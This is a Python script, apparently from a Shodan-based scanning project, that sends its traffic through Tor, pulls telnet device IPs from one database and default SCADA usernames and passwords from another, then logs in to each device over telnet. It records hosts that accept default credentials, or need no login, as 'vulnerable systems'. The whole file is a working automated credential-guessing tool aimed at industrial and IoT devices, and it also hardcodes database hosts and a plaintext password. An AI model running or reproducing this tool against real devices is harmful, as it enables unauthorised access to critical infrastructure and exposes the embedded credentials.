#!/user/bin/python

from urllib.request import urlopen
import socket
import socks
import telnetlib
import pymysql
import json
import sys

db_10 = pymysql.connect(host="10.128.50.165",  # your host, usually localhost
                        port=8080,
                        user="shodan",  # your username
                        passwd="Sh0d@n7e",  # your password
                        db="test",
                        charset='utf8',
                        autocommit=True)  # name of the data base

db_128 = pymysql.connect(host="128.196.27.147",  # your host, usually localhost
                         user="ShodanTeam",  # your username
                         passwd="Sh0d@n7e",  # your password
                         db="passworddb",
                         charset='utf8',
                         autocommit=True)  # name of the data base


def connectTor():
    arg1 = sys.argv[1]
    arg2 = sys.argv[2]
    f = open(arg1 + "_" + arg2 + "_out.log", "a")
    g = open(arg1 + "_" + arg2 + ".log", "a")

    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150, True)
    socket.socket = socks.socksocket
    
    data = json.loads(urlopen("http://ip-api.com/json").read().decode("latin1"))
    g.write('Testing data using IP: ' + data["query"] + "\n")
    g.flush()

    cursor_10 = db_10.cursor()
    # cursor_10_insert = db_10.cursor()
    cursor_128 = db_128.cursor()

    try:
        sql = "select id, ip_str from telnet_device limit %s, %s;" \
              % (sys.argv[1], str(int(sys.argv[2]) - int(sys.argv[1]) + 1))

        cursor_10.execute(sql)
        
        # conn = sqlite3.connect(':memory:')
        #
        # cur_conn = conn.cursor()
        # cur_conn.execute("CREATE table data (id text, ip_str text)")
        # conn.commit()
        #
        # for row in cursor_10:
        #     cur_conn.execute("insert into data(id, ip_str) values ('%s', '%s');" % (row[0], row[1]))

        sql2 = "SELECT * FROM passworddb.scadapasswords"
        # Execute the SQL command
        cursor_128.execute(sql2)
        # Commit your changes in the database
        results_128 = cursor_128.fetchall()

        # % (keyword, keyword, keyword, keyword, keyword)
        try:
            # Execute the SQL command
            # cur_conn.execute("select min(id), ip_str from data group by ip_str")

            for row in cursor_10:
                ip_id = row[0]
                ip = row[1]
                # Now print fetched result
                g.write("IP = %s\n" % ip)
                g.flush()
                # requests.session(headers=headers, hooks=hooks, verify=False)
                ipaddr = ip
                # print('connected to device, no login')

                try:
                    for row_128 in results_128:
                        passID = row_128[0]
                        UserName = row_128[9]
                        Password = row_128[10]
                        # Now print fetched result

                        HOST = ip
                        user = UserName.encode('ascii', 'ignore')
                        password = Password.encode('ascii', 'ignore')

                        tn = telnetlib.Telnet(HOST, '', 4)
                        g.write("tel success\n")
                        g.flush()

                        try:
                            line = tn.read_until("A$tring+hatWouldN0tExist".encode('ascii','ignore'), 3)

                            strline = str(line)
                            strline = strline.replace('\'', '')
                            line = strline.lower()
                            # g.write(line+"\n")
                            if ("login" in line) or ("user" in line) or ("password" in line) or \
                                    ("closing connection" in line):
                                try:
                                    g.write(str(passID)+"\n")
                                    g.flush()
                                    try:
                                        tn.write(user + b"\n")
                                        g.write("Success user write\n")
                                        g.flush()
                                    except Exception as e:
                                        g.write("Fail user write %s\n" % e)
                                        g.flush()
                                        tn.close()
                                    if password:
                                        # reg = re.compile("password", re.I)
                                        # print tn.expect(reg)
                                        tn.read_until(b"assword: ", 3)
                                        try:
                                            tn.write(password + b"\n")
                                            g.write("Success pass write\n")
                                            g.flush()
                                        except:
                                            g.write("Fail pass write")
                                            g.flush()
                                            tn.close()
                                    try:
                                        line2 = tn.read_until("A$tring+hatWouldN0tExist".encode('ascii','ignore'), 5)

                                        strline = str(line2)
                                        strline = strline.replace('\'', '')
                                        line2 = strline.lower()
                                        if not (("user" in line2) or ("login" in line2) or
                                                    ("password" in line2) or ("fail" in line2) or
                                                    ("reject" in line2)):
                                            # print(line2)
                                            try:
                                                # print passID
                                                sql = "INSERT INTO vulnerablesystems_test(ip_id, ipaddr, passwordid, notes, openport) \
                                                           VALUES ('%s', '%s', '%s', '%s', '%s')" % (
                                                    ip_id, ipaddr, passID, line, '')
                                                f.write(sql)
                                                f.write("\n")
                                                f.flush()
                                                g.write("successfully inserted a default pass\n")
                                                g.flush()
                                                tn.close()
                                                break
                                            except:
                                                g.write('error on SQL insert\n')
                                                g.flush()
                                                tn.close()
                                            # try:
                                            # Log the SQL command
                                            # f.write(sql)
                                            # f.write("\n")
                                            # g.write("successfully inserted a default pass\n")
                                            # except Exception as e:
                                            #     g.write('Error: %s\n' % e)
                                            #     # Rollback in case there is any error
                                            #     db_10.rollback()
                                            #     print("Error inserting Data: rolledback")
                                            #     tn.close()
                                            # print "ilon success!"
                                            # print line
                                            tn.close()
                                        else:
                                            g.write("User and Psw don't match\n")
                                            g.flush()
                                            tn.close()

                                    except Exception as e:
                                        g.write("Error on connecting: %s\n" % e) 
                                        g.flush()
                                        tn.close()

                                except Exception as e:
                                    g.write('Error on info retrieve: %s\n' % e)
                                    g.flush()
                                    tn.close()

                                tn.close()
                            elif ("refuse" in line) or ("reject" in line):
                                g.write("connection refused\n")
                                g.flush()
                                tn.close()
                            else:
                                g.write("No known login needed\n")
                                g.write(line)
                                g.flush()
                                try:
                                    # print passID
                                    sql = "INSERT INTO vulnerablesystems_test(ip_id, ipaddr, passwordid, notes, openport) \
                                               VALUES ('%s', '%s', '%s', '%s', '%s')" % (
                                        ip_id, ipaddr, '5002', line, 'no login needed')
                                    tn.close()
                                    f.write(sql)
                                    f.write("\n")
                                    f.flush()
                                    g.write("successfully inserted a default pass\n")
                                    g.flush()
                                    break
                                except Exception as e:
                                    g.write('Error on SQL insert %s\n' % e)
                                    g.flush()  
                                    tn.close()
                                # try:

                                # Log the SQL command
                               
                                # except Exception as e:
                                #     print('Error: %s' % e)
                                #     # Rollback in case there is any error
                                #     db_10.rollback()
                                #     print("Error inserting Data: rolledback")
                                #     tn.close()
                                tn.close()

                            # print(tn.read_all())
                        except Exception as e:
                            g.write("Telnet Server Not Available %s\n" % e)
                            g.flush() 
                            tn.close()

                except Exception as e:
                    g.write('server timeout: %s\n' % e)
                    g.flush()

        except Exception as e:
            g.write('Error: %s\n' % e)
            g.flush()

        f.close()
        g.close()

    except Exception as e:
        g.write('Error: %s\n' % e)
        db_10.close()
        db_128.close()
        f.close()
        g.close()


if __name__ == '__main__':
    connectTor()
